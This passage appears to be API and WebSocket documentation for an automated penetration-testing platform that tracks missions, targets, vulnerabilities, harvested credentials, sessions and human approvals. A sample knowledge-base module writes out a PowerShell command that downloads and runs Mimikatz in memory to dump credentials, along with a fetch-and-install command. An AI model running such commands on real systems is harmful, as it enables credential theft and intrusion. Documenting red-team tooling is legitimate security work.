  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "name": "Mission Alpha",
  "status": "created",
  "message": "Mission created successfully"
}
```

**Frontend Integration**:
- Component: `Home.tsx` - Mission creation form
- API Client: `missionsApi.create(data)`
- Store: Update `missionStore` with new mission

#### 3.1.2 List Missions
```http
GET /api/v1/missions

Response (200):
[
  "550e8400-e29b-41d4-a716-446655440000",
  "660e8400-e29b-41d4-a716-446655440001"
]
```

**Frontend Integration**:
- Component: `Missions.tsx` - Mission list view
- API Client: `missionsApi.list()`
- State: Populate mission selector dropdown

#### 3.1.3 Get Mission Details
```http
GET /api/v1/missions/{mission_id}

Response (200):
{
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "name": "Mission Alpha",
  "status": "running",
  "scope": ["192.168.1.0/24"],
  "goals": {
    "domain_admin": "pending",
    "data_exfil": "pending"
  },
  "statistics": {
    "targets_discovered": 12,
    "vulns_found": 5,
    "creds_harvested": 3,
    "sessions_established": 2
  },
  "target_count": 12,
  "vuln_count": 5,
  "created_at": "2026-01-03T10:00:00Z",
  "started_at": "2026-01-03T10:05:00Z"
}
```

**Frontend Integration**:
- Component: `Operations.tsx` - Mission dashboard
- API Client: `missionsApi.get(id)`
- Display: Statistics cards, goal progress, timeline

#### 3.1.4 Start Mission
```http
POST /api/v1/missions/{mission_id}/start

Response (200):
{
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "name": "",
  "status": "running",
  "message": "Mission started successfully"
}
```

**Backend Behavior**:
1. Validates mission status (must be "created" or "paused")
2. Creates initial network scan task based on scope
3. Starts specialist agents
4. Updates mission status to "running"
5. Starts monitor & watchdog loops

**Frontend Integration**:
- Button: "Start Mission" in Operations page
- API Client: `missionsApi.start(id)`
- Effect: Status badge updates, WebSocket connection opens

#### 3.1.5 Pause Mission
```http
POST /api/v1/missions/{mission_id}/pause

Response (200):
{
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "name": "",
  "status": "paused",
  "message": "Mission paused successfully"
}
```

#### 3.1.6 Resume Mission
```http
POST /api/v1/missions/{mission_id}/resume

Response (200):
{
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "name": "",
  "status": "running",
  "message": "Mission resumed successfully"
}
```

#### 3.1.7 Stop Mission
```http
POST /api/v1/missions/{mission_id}/stop

Response (200):
{
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "name": "",
  "status": "completed",
  "message": "Mission stopped successfully"
}
```

#### 3.1.8 Get Mission Statistics
```http
GET /api/v1/missions/{mission_id}/stats

Response (200):
{
  "targets_discovered": 12,
  "vulns_found": 5,
  "creds_harvested": 3,
  "sessions_established": 2,
  "goals_achieved": 1,
  "goals_total": 2,
  "completion_percentage": 50.0
}
```

**Frontend Integration**:
- Component: Statistics cards in Operations page
- Auto-refresh: Poll every 5 seconds or use WebSocket updates
- Visualization: Progress bars, charts, counters

---


### 3.2 Target Management API

**Base Path**: `/api/v1/missions/{mission_id}/targets`

#### 3.2.1 List Targets
```http
GET /api/v1/missions/{mission_id}/targets

Response (200):
[
  {
    "target_id": "target_001",
    "ip": "192.168.1.10",
    "hostname": "DC01.corp.local",
    "os": "Windows Server 2019",
    "status": "scanned",
    "priority": "high",
    "risk_score": 8.5,
    "ports": {
      "22": "ssh OpenSSH 8.2",
      "80": "http Apache 2.4",
      "445": "smb Microsoft-DS"
    }
  }
]
```

**Frontend Integration**:
- Component: Target list in Operations page
- API Client: `targetsApi.list(missionId)`
- Display: Table with IP, hostname, OS, status, risk score
- Actions: Click to view details, scan ports, etc.

#### 3.2.2 Get Target Details
```http
GET /api/v1/missions/{mission_id}/targets/{target_id}

Response (200):
{
  "target_id": "target_001",
  "ip": "192.168.1.10",
  "hostname": "DC01.corp.local",
  "os": "Windows Server 2019",
  "status": "exploited",
  "priority": "high",
  "risk_score": 8.5,
  "ports": {
    "135": "msrpc",
    "139": "netbios-ssn",
    "445": "microsoft-ds",
    "3389": "ms-wbt-server"
  }
}
```

---

### 3.3 Vulnerability Management API

**Base Path**: `/api/v1/missions/{mission_id}/vulnerabilities`

#### 3.3.1 List Vulnerabilities
```http
GET /api/v1/missions/{mission_id}/vulnerabilities

Response (200):
[
  {
    "vuln_id": "vuln_001",
    "target_id": "target_001",
    "type": "CVE-2021-34527",
    "name": "PrintNightmare",
    "severity": "critical",
    "cvss": 9.8,
    "status": "discovered",
    "exploit_available": true
  }
]
```

**Frontend Integration**:
- Component: Vulnerability list with severity badges
- API Client: `vulnsApi.list(missionId)`
- Display: CVE ID, target, severity, exploit status
- Filter: By severity (critical, high, medium, low)

---

### 3.4 Credential Management API

**Base Path**: `/api/v1/missions/{mission_id}/credentials`

#### 3.4.1 List Credentials
```http
GET /api/v1/missions/{mission_id}/credentials

Response (200):
[
  {
    "cred_id": "cred_001",
    "target_id": "target_001",
    "type": "password",
    "username": "administrator",
    "domain": "CORP",
    "privilege_level": "admin",
    "source": "mimikatz",
    "verified": true,
    "created_at": "2026-01-03T10:30:00Z"
  }
]
```

**Frontend Integration**:
- Component: CredentialCard in ArtifactCard
- Display: Username, domain, privilege level, source
- Security: Never display actual passwords in UI
- Actions: Mark as verified, test credential

---

### 3.5 Session Management API

**Base Path**: `/api/v1/missions/{mission_id}/sessions`

#### 3.5.1 List Sessions
```http
GET /api/v1/missions/{mission_id}/sessions

Response (200):
[
  {
    "session_id": "session_001",
    "target_id": "target_001",
    "type": "ssh",
    "user": "admin",
    "privilege": "admin",
    "status": "active",
    "established_at": "2026-01-03T10:45:00Z",
    "last_activity": "2026-01-03T11:00:00Z"
  }
]
```

**Frontend Integration**:
- Component: Session cards showing active connections
- Display: Session type, user, privilege, status
- Actions: Interact with session, close session
- Indicator: Green dot for active, gray for idle

---

### 3.6 HITL (Human-in-the-Loop) API

**Base Path**: `/api/v1/missions/{mission_id}`

#### 3.6.1 List Pending Approvals
```http
GET /api/v1/missions/{mission_id}/approvals

Response (200):
[
  {
    "action_id": "action_001",
    "action_type": "exploit",
    "action_description": "Exploit PrintNightmare on DC01",
    "target_ip": "192.168.1.10",
    "risk_level": "high",
    "risk_reasons": [
      "Critical CVE exploitation",
      "Domain controller target",
      "May cause service disruption"
    ],
    "potential_impact": "System crash, service interruption",
    "command_preview": "python3 exploit.py --target 192.168.1.10",
    "requested_at": "2026-01-03T11:00:00Z",
    "expires_at": "2026-01-03T11:30:00Z"
  }
]
```

**Frontend Integration**:
- Component: ApprovalCard in AIChatPanel
- Display: Action description, risk level (with color coding), target, command preview
- Actions: Approve button (green), Reject button (red)
- Notifications: Real-time alert when new approval request arrives

#### 3.6.2 Approve Action
```http
POST /api/v1/missions/{mission_id}/approve/{action_id}
Content-Type: application/json

Request Body (Optional):
{
  "user_comment": "Approved after risk assessment"
}

Response (200):
{
  "success": true,
  "message": "Action approved successfully. Mission execution resumed.",
  "action_id": "action_001",
  "mission_status": "running"
}
```

**Backend Behavior**:
1. Validates action exists and belongs to mission
2. Updates approval status to "approved"
3. Publishes approval response event to Blackboard
4. Resumes mission execution
5. Broadcasts WebSocket event to frontend

**Frontend Integration**:
- Button: "Approve" in ApprovalCard
- API Client: `approvalsApi.approve(missionId, actionId, comment)`
- Effect: Card disappears, success toast notification
- WebSocket: Receives approval_response event

#### 3.6.3 Reject Action
```http
POST /api/v1/missions/{mission_id}/reject/{action_id}
Content-Type: application/json

Request Body (Optional):
{
  "rejection_reason": "Too risky for production environment",
  "user_comment": "Find alternative approach"
}

Response (200):
{
  "success": true,
  "message": "Action rejected. System will seek alternatives.",
  "action_id": "action_001",
  "mission_status": "running"
}
```

**Backend Behavior**:
1. Validates action exists
2. Updates approval status to "rejected"
3. Publishes rejection event
4. Specialist agents look for alternative approaches
5. Mission continues with different strategy

---

### 3.7 Chat API

**Base Path**: `/api/v1/missions/{mission_id}/chat`

#### 3.7.1 Send Chat Message
```http
POST /api/v1/missions/{mission_id}/chat
Content-Type: application/json

Request Body:
{
  "content": "What's the current status?",
  "related_task_id": null,
  "related_action_id": null
}

Response (200):
{
  "id": "msg_001",
  "role": "user",
  "content": "What's the current status?",
  "timestamp": "2026-01-03T11:15:00Z",
  "related_task_id": null,
  "related_action_id": null
}
```

**Frontend Integration**:
- Component: Chat input in AIChatPanel
- API Client: `chatApi.send(missionId, message)`
- Display: User message appears immediately in chat
- Expectation: AI response arrives via WebSocket

#### 3.7.2 Get Chat History
```http
GET /api/v1/missions/{mission_id}/chat?limit=50

Response (200):
[
  {
    "id": "msg_001",
    "role": "user",
    "content": "What's the current status?",
    "timestamp": "2026-01-03T11:15:00Z"
  },
  {
    "id": "msg_002",
    "role": "assistant",
    "content": "Mission is running. 12 targets discovered, 5 vulnerabilities found.",
    "timestamp": "2026-01-03T11:15:05Z"
  }
]
```

**Frontend Integration**:
- Component: Chat history in AIChatPanel
- API Client: `chatApi.getHistory(missionId, limit)`
- Display: Scrollable chat history
- Load More: Fetch older messages with offset

---

### 3.8 Knowledge Base API

**Base Path**: `/api/v1/knowledge`

#### 3.8.1 Get Knowledge Statistics
```http
GET /api/v1/knowledge/stats

Response (200):
{
  "total_techniques": 201,
  "total_tactics": 14,
  "total_rx_modules": 1761,
  "platforms": ["windows", "linux", "macos", "aws", "azure", "gcp"],
  "modules_per_platform": {
    "windows": 856,
    "linux": 542,
    "macos": 363
  },
  "modules_per_executor": {
    "powershell": 654,
    "sh": 523,
    "bash": 312,
    "cmd": 145
  },
  "memory_size_mb": 12.5,
  "loaded": true,
  "total_nuclei_templates": 7234,
  "nuclei_by_severity": {
    "critical": 342,
    "high": 1245,
    "medium": 2876,
    "low": 1823,
    "info": 948
  },
  "nuclei_by_protocol": {
    "http": 6234,
    "tcp": 543,
    "dns": 234,
    "ssl": 223
  }
}
```

**Frontend Integration**:
- Component: Knowledge page dashboard
- Display: Statistics cards, platform distribution charts
- API Client: `knowledgeApi.getStats()`

#### 3.8.2 List Techniques
```http
GET /api/v1/knowledge/techniques?platform=windows&limit=100&offset=0

Response (200):
{
  "items": [
    {
      "id": "T1003",
      "name": "OS Credential Dumping",
      "description": "Adversaries may attempt to dump credentials...",
      "platforms": ["windows", "linux", "macos"],
      "test_count": 12
    }
  ],
  "total": 201,
  "limit": 100,
  "offset": 0
}
```

#### 3.8.3 Get Technique Details
```http
GET /api/v1/knowledge/techniques/T1003

Response (200):
{
  "id": "T1003",
  "name": "OS Credential Dumping",
  "description": "Adversaries may attempt to dump credentials to obtain account login and credential material...",
  "platforms": ["windows", "linux", "macos"],
  "test_count": 12
}
```

#### 3.8.4 Get Modules for Technique
```http
GET /api/v1/knowledge/techniques/T1003/modules?platform=windows

Response (200):
[
  {
    "rx_module_id": "rx-t1003-001",
    "index": 1,
    "technique_id": "T1003",
    "technique_name": "OS Credential Dumping",
    "description": "Credential Dumping with Mimikatz",
    "execution": {
      "platforms": ["windows"],
      "executor_type": "powershell",
      "command": "IEX (New-Object Net.WebClient).DownloadString('#{mimikatz_url}'); Invoke-Mimikatz -DumpCreds",
      "elevation_required": true,
      "cleanup_command": "Remove-Item $env:TEMP\\mimikatz.exe -Force"
    },
    "variables": [
      {
        "name": "mimikatz_url",
        "description": "URL to Mimikatz binary",
        "type": "url",
        "default_value": "https://example.com/mimikatz.exe"
      }
    ],
    "prerequisites": [
      {
        "description": "Mimikatz must be available",
        "check_command": "Test-Path C:\\Tools\\mimikatz.exe",
        "install_command": "Invoke-WebRequest #{mimikatz_url} -OutFile C:\\Tools\\mimikatz.exe"
      }
    ]
  }
]
```

**Frontend Integration**:
- Component: Knowledge browser page
- Display: Technique cards with module counts
- Navigation: Click technique â†’ view modules â†’ view module details
- Search: Filter by name, platform, tactic

#### 3.8.5 Search Modules
```http
GET /api/v1/knowledge/search?q=mimikatz&platform=windows&limit=20

Response (200):
[
  {
    "rx_module_id": "rx-t1003-001",
    "technique_id": "T1003",
    "technique_name": "OS Credential Dumping",
    "description": "Credential Dumping with Mimikatz",
    ...
  }
]
```

#### 3.8.6 Get Best Module for Task
```http
POST /api/v1/knowledge/best-module
Content-Type: application/json

Request Body:
{
  "tactic": "credential-access",
  "technique": "T1003",
  "platform": "windows",
  "executor_type": "powershell",
  "require_elevation": true
}

Response (200):
{
  "rx_module_id": "rx-t1003-002",
  "technique_id": "T1003",
  "technique_name": "OS Credential Dumping",
  "description": "Mimikatz - sekurlsa::logonpasswords",
  ...
}
```

**Backend Logic**:
- Scores modules based on criteria match
- Prefers modules that match all criteria
- Returns highest scoring module
- Returns null if no suitable module found

**Frontend Integration**:
- Used internally by specialists to select modules
- Can be exposed in UI for manual module selection
- Useful for "Suggest Module" feature

#### 3.8.7 Nuclei Templates API

```http
GET /api/v1/knowledge/nuclei/templates?severity=critical&limit=100&offset=0

Response (200):
{
  "items": [
    {
      "template_id": "CVE-2021-44228",
      "name": "Log4j RCE - CVE-2021-44228",
      "severity": "critical",
      "protocol": ["http"],
      "cve_id": "CVE-2021-44228",
      "cwe_id": "CWE-502",
      "cvss_score": 10.0,
      "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
      "tags": ["cve", "rce", "log4j", "jndi", "critical"],
      "description": "Apache Log4j2 JNDI RCE",
      "author": "pdteam",
      "reference": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
      "file_path": "/data/nuclei/cves/2021/CVE-2021-44228.yaml"
    }
  ],
  "total": 342,
  "limit": 100,
  "offset": 0
}
```

**Frontend Integration**:
- Component: Nuclei templates browser
- Display: Template cards with severity badges
- Filter: By severity, protocol, tags
- Actions: View template details, use template

---

## 4. Ø§ØªØµØ§Ù„Ø§Øª WebSocket

### 4.1 WebSocket Endpoints

#### 4.1.1 Global WebSocket
```
ws://172.245.232.188:8000/ws
```

**Purpose**: Receive all system events across all missions

**Connection Flow**:
```javascript
const ws = new WebSocket('ws://172.245.232.188:8000/ws');

ws.onopen = () => {
  console.log('Connected to RAGLOX');
};

ws.onmessage = (event) => {
  const message = JSON.parse(event.data);
  handleWebSocketEvent(message);
};

// Keep-alive ping
setInterval(() => {
  ws.send(JSON.stringify({ type: 'ping' }));
}, 30000);
```

**Events Received**:
- `connected` - Connection established
- `pong` - Ping response
- All mission events (from all missions)

#### 4.1.2 Mission-Specific WebSocket
```
ws://172.245.232.188:8000/ws/missions/{mission_id}
```

**Purpose**: Receive events for specific mission only

**Connection Flow**:
```javascript
const missionId = '550e8400-e29b-41d4-a716-446655440000';
const ws = new WebSocket(`ws://172.245.232.188:8000/ws/missions/${missionId}`);

ws.onopen = () => {
  console.log(`Connected to mission ${missionId}`);
  // Subscribe to specific event types
  ws.send(JSON.stringify({
    type: 'subscribe',
    events: ['new_target', 'new_vuln', 'approval_request']
  }));
};

ws.onmessage = (event) => {
  const message = JSON.parse(event.data);
  // Handle mission-specific events
  switch(message.type) {
    case 'new_target':
      addTarget(message.data);
      break;
    case 'approval_request':
      showApprovalNotification(message.data);
      break;
    // ...
  }
};
```

**Best Practice**: Use mission-specific WebSocket in Operations page to avoid processing events from other missions.

---

### 4.2 WebSocket Event Types

#### 4.2.1 Connection Events

**`connected`**
```json
{
  "type": "connected",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "message": "Connected to mission 550e8400-e29b-41d4-a716-446655440000",
  "timestamp": "2026-01-03T11:00:00Z"
}
```

**`pong`**
```json
{
  "type": "pong",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "timestamp": "2026-01-03T11:00:30Z"
}
```

**`subscribed`**
```json
{
  "type": "subscribed",
  "events": ["new_target", "new_vuln"],
  "timestamp": "2026-01-03T11:00:01Z"
}
```

**`error`**
```json
{
  "type": "error",
  "message": "Invalid JSON"
}
```

---

#### 4.2.2 Mission Events

**`new_target`** - New target discovered
```json
{
  "type": "new_target",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "data": {
    "target_id": "target_001",
    "ip": "192.168.1.10",
    "hostname": "DC01.corp.local"
  },
  "timestamp": "2026-01-03T11:05:00Z"
}
```

**Frontend Integration**:
- Component: Add target card to Operations page
- Animation: Slide-in animation for new target
- Notification: Toast notification "New target discovered: 192.168.1.10"

**`target_update`** - Target status changed
```json
{
  "type": "target_update",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "data": {
    "target_id": "target_001",
    "status": "exploited",
    "risk_score": 9.2
  },
  "timestamp": "2026-01-03T11:15:00Z"
}
```

**`new_vuln`** - New vulnerability found
```json
{
  "type": "new_vuln",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "data": {
    "vuln_id": "vuln_001",
    "target_id": "target_001",
    "severity": "critical",
    "type": "CVE-2021-34527"
  },
  "timestamp": "2026-01-03T11:10:00Z"
}
```

**Frontend Integration**:
- Component: Add vulnerability card
- Alert: High-priority alert for critical/high severity
- Badge: Update target's vulnerability count badge

**`new_cred`** - New credential harvested
```json
{
  "type": "new_cred",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "data": {
    "cred_id": "cred_001",
    "target_id": "target_001",
    "username": "administrator",
    "privilege_level": "admin"
  },
  "timestamp": "2026-01-03T11:20:00Z"
}
```

**Frontend Integration**:
- Component: CredentialCard in timeline
- Notification: "New credential: administrator@DC01"
- Counter: Update credentials harvested counter

**`new_session`** - New session established
```json
{
  "type": "new_session",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "data": {
    "session_id": "session_001",
    "target_id": "target_001",
    "type": "ssh",
    "privilege": "admin"
  },
  "timestamp": "2026-01-03T11:25:00Z"
}
```

**Frontend Integration**:
- Component: Session card with green "ACTIVE" badge
- Notification: "New session established on DC01"
- Counter: Update sessions counter

**`goal_achieved`** - Mission goal completed
```json
{
  "type": "goal_achieved",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "data": {
    "goal": "domain_admin"
  },
  "timestamp": "2026-01-03T11:30:00Z"
}
```

**Frontend Integration**:
- Animation: Celebration animation (confetti, checkmark)
- Notification: Large success notification "Goal achieved: Domain Admin"
- Progress: Update goal progress bar
- Audio: Optional success sound

**`status_change`** - Mission status changed
```json
{
  "type": "status_change",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "data": {
    "old_status": "running",
    "new_status": "paused"
  },
  "timestamp": "2026-01-03T11:35:00Z"
}
```

**Frontend Integration**:
- Badge: Update mission status badge
- UI: Enable/disable appropriate action buttons
- Notification: "Mission paused"

**`statistics`** - Stats update
```json
{
  "type": "statistics",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "data": {
    "targets_discovered": 15,
    "vulns_found": 7,
    "creds_harvested": 4,
    "sessions_established": 3
  },
  "timestamp": "2026-01-03T11:40:00Z"
}
```

**Frontend Integration**:
- Component: Update statistics cards
- Animation: Number counting animation
- Charts: Update real-time charts

---

#### 4.2.3 HITL Events

**`approval_request`** - User approval needed
```json
{
  "type": "approval_request",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "data": {
    "action_id": "action_001",
    "action_type": "exploit",
    "action_description": "Exploit PrintNightmare on DC01",
    "target_ip": "192.168.1.10",
    "target_hostname": "DC01.corp.local",
    "risk_level": "high",
    "risk_reasons": [
      "Critical CVE exploitation",
      "Domain controller target"
    ],
    "potential_impact": "System crash, service interruption",
    "command_preview": "python3 exploit.py --target 192.168.1.10",
    "expires_at": "2026-01-03T11:30:00Z"
  },
  "timestamp": "2026-01-03T11:00:00Z"
}
```

**Frontend Integration**:
- Component: ApprovalCard appears in AIChatPanel
- Notification: High-priority alert with sound
- Modal: Optional full-screen approval modal for critical actions
- Timer: Countdown timer showing expiration time
- Color: Risk level color coding (red=high, orange=medium, yellow=low)

**`approval_response`** - Approval decision made
```json
{
  "type": "approval_response",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "data": {
    "action_id": "action_001",
    "approved": true,
    "rejection_reason": null,
    "user_comment": "Approved after risk assessment"
  },
  "timestamp": "2026-01-03T11:05:00Z"
}
```

**Frontend Integration**:
- Component: Remove ApprovalCard from UI
- Notification: "Action approved - execution resumed"
- Log: Add to mission activity log

**`approval_resolved`** - Approval completed (executed or alternative found)
```json
{
  "type": "approval_resolved",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "data": {
    "action_id": "action_001",
    "resolution": "executed",
    "result": "success"
  },
  "timestamp": "2026-01-03T11:10:00Z"
}
```

---

#### 4.2.4 Chat Events

**`chat_message`** - New chat message
```json
{
  "type": "chat_message",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "data": {
    "message_id": "msg_002",
    "role": "assistant",
    "content": "Mission is running. 15 targets discovered, 7 vulnerabilities found.",
    "related_task_id": null,
    "related_action_id": null
  },
  "timestamp": "2026-01-03T11:15:05Z"
}
```

**Frontend Integration**:
- Component: Add message to AIChatPanel
- Animation: Slide-in from bottom
- Auto-scroll: Scroll to latest message
- Typing indicator: Show typing indicator before message appears

---

#### 4.2.5 AI Plan Events

**`ai_plan`** - AI generated execution plan
```json
{
  "type": "ai_plan",
  "mission_id": "550e8400-e29b-41d4-a716-446655440000",
  "data": {
    "plan_id": "plan_001",
    "subtype": "nuclei_scan",
    "message": "Planning Nuclei scan on port 8080",
    "port": 8080,
    "templates_count": 15,
    "templates": [
      "CVE-2021-44228",
      "CVE-2022-12345"
    ],
    "reasoning": "Port 8080 detected running HTTP service. Using 15 relevant templates for web application testing."
  },
  "timestamp": "2026-01-03T11:20:00Z"
}
```

**Frontend Integration**:
- Component: AIPlanCard in timeline
- Display: Show plan details with template list
- Icon: AI icon with animation
- Expandable: Click to expand full plan details

---

### 4.3 WebSocket Error Handling

**Connection Lost**:
```javascript
ws.onerror = (error) => {
  console.error('WebSocket error:', error);
  showNotification('Connection error', 'error');
};

ws.onclose = (event) => {
  console.log('WebSocket closed:', event.code, event.reason);
  // Attempt reconnection with exponential backoff
  scheduleReconnect();
};

function scheduleReconnect() {
  const delay = Math.min(30000, (Math.pow(2, reconnectAttempts) * 1000));
  setTimeout(() => {
    reconnectAttempts++;
    connectWebSocket();
  }, delay);
}
```

**Best Practices**:
1. **Automatic Reconnection**: Implement exponential backoff
2. **Buffering**: Queue messages during disconnection
3. **UI Indication**: Show connection status indicator
4. **Fallback**: Poll REST API if WebSocket unavailable

---


## 5. Ù†Ù…Ø§Ø°Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ§Ù„Ù‡ÙŠØ§ÙƒÙ„

### 5.1 Backend Models (Pydantic)

#### Mission Model
```python
class Mission(BaseEntity):
    name: str
    description: Optional[str]
    status: MissionStatus
    scope: List[str]
    goals: Dict[str, GoalStatus]
    constraints: Dict[str, Any]
    started_at: Optional[datetime]
    completed_at: Optional[datetime]
    targets_discovered: int = 0
    vulns_found: int = 0
    creds_harvested: int = 0
    sessions_established: int = 0
    goals_achieved: int = 0
```

#### Target Model
```python
class Target(BaseEntity):
    mission_id: UUID
    ip: str
    hostname: Optional[str]
    os: Optional[str]
    os_version: Optional[str]
    status: TargetStatus
    priority: Priority
    risk_score: Optional[float]
    ports: Dict[int, str]
    services: List[Service]
```

#### Vulnerability Model
```python
class Vulnerability(BaseEntity):
    mission_id: UUID
    target_id: UUID
    type: str  # CVE-2021-XXXXX
    name: Optional[str]
    description: Optional[str]
    severity: Severity
    cvss: Optional[float]
    status: str  # discovered, verified, exploited
    exploit_available: bool
    rx_modules: List[str]  # Available exploit modules
```

#### Credential Model
```python
class Credential(BaseEntity):
    mission_id: UUID
    target_id: UUID
    type: CredentialType
    username: Optional[str]
    domain: Optional[str]
    value_encrypted: Optional[bytes]
    source: Optional[str]  # mimikatz, brute_force, intel:arthouse
    verified: bool
    privilege_level: PrivilegeLevel
    reliability_score: float  # 0.0-1.0
    source_metadata: Dict[str, Any]
```

#### Session Model
```python
class Session(BaseEntity):
    mission_id: UUID
    target_id: UUID
    type: SessionType
    user: str
    privilege: PrivilegeLevel
    status: SessionStatus
    established_at: datetime
    last_activity: Optional[datetime]
    metadata: Dict[str, Any]
```

#### Approval Action Model (HITL)
```python
class ApprovalAction(BaseModel):
    id: UUID
    mission_id: UUID
    action_type: ActionType
    action_description: str
    target_id: Optional[UUID]
    target_ip: Optional[str]
    target_hostname: Optional[str]
    risk_level: RiskLevel
    risk_reasons: List[str]
    potential_impact: Optional[str]
    command_preview: Optional[str]
    status: ApprovalStatus
    requested_at: datetime
    expires_at: Optional[datetime]
    responded_at: Optional[datetime]
    approved: Optional[bool]
    rejection_reason: Optional[str]
    user_comment: Optional[str]
```

---

### 5.2 Frontend Types (TypeScript)

Los tipos en el frontend estÃ¡n definidos en `/webapp/frontend/client/src/types/index.ts` y coinciden con los modelos del backend:

```typescript
export interface Mission {
  mission_id: string;
  name: string;
  status: MissionStatus;
  scope: string[];
  goals: Record<string, string>;
  statistics: MissionStatistics;
  created_at: string;
  started_at?: string;
}

export interface Target {
  target_id: string;
  ip: string;
  hostname?: string;
  os?: string;
  status: TargetStatus;
  priority: Priority;
  risk_score: number;
  ports: Record<string, string>;
}

// Similarly for Vulnerability, Credential, Session, etc.
```

**ObservaciÃ³n**: Los tipos estÃ¡n bien alineados entre backend y frontend, lo que facilita la integraciÃ³n.

---

## 6. ØªØ¯ÙÙ‚ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ¢Ù„ÙŠØ§Øª Ø§Ù„ØªÙƒØ§Ù…Ù„

### 6.1 Mission Creation Flow

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Frontend   â”‚         â”‚   Backend    â”‚         â”‚  Blackboard â”‚
â”‚  (Home.tsx) â”‚         â”‚   (routes)   â”‚         â”‚   (Redis)   â”‚
â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
      â”‚                        â”‚                        â”‚
      â”‚ POST /missions         â”‚                        â”‚
      â”‚ {name, scope, goals}   â”‚                        â”‚
      â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚                        â”‚
      â”‚                        â”‚                        â”‚
      â”‚                        â”‚ create_mission()       â”‚
      â”‚                        â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚
      â”‚                        â”‚                        â”‚
      â”‚                        â”‚ HSET mission:{id}      â”‚
      â”‚                        â”‚<â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
      â”‚                        â”‚                        â”‚
      â”‚ {mission_id, status}   â”‚                        â”‚
      â”‚<â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                        â”‚
      â”‚                        â”‚                        â”‚
      â”‚ Navigate to            â”‚                        â”‚
      â”‚ /operations/{id}       â”‚                        â”‚
      â”‚                        â”‚                        â”‚
```

### 6.2 Mission Start Flow

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Frontend   â”‚    â”‚   Backend    â”‚    â”‚ Controller  â”‚    â”‚ Specialist â”‚
â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
      â”‚                   â”‚                    â”‚                  â”‚
      â”‚ POST /start       â”‚                    â”‚                  â”‚
      â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚                    â”‚                  â”‚
      â”‚                   â”‚ start_mission()    â”‚                  â”‚
      â”‚                   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚                  â”‚
      â”‚                   â”‚                    â”‚                  â”‚
      â”‚                   â”‚                    â”‚ Create initial   â”‚
      â”‚                   â”‚                    â”‚ scan task        â”‚
      â”‚                   â”‚                    â”‚                  â”‚
      â”‚                   â”‚                    â”‚ Start specialistsâ”‚
      â”‚                   â”‚                    â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚
      â”‚                   â”‚                    â”‚                  â”‚
      â”‚                   â”‚                    â”‚                  â”‚ Read tasks
      â”‚                   â”‚                    â”‚                  â”‚ from BB
      â”‚                   â”‚                    â”‚                  â”‚
      â”‚  WebSocket: status_change            â”‚                  â”‚
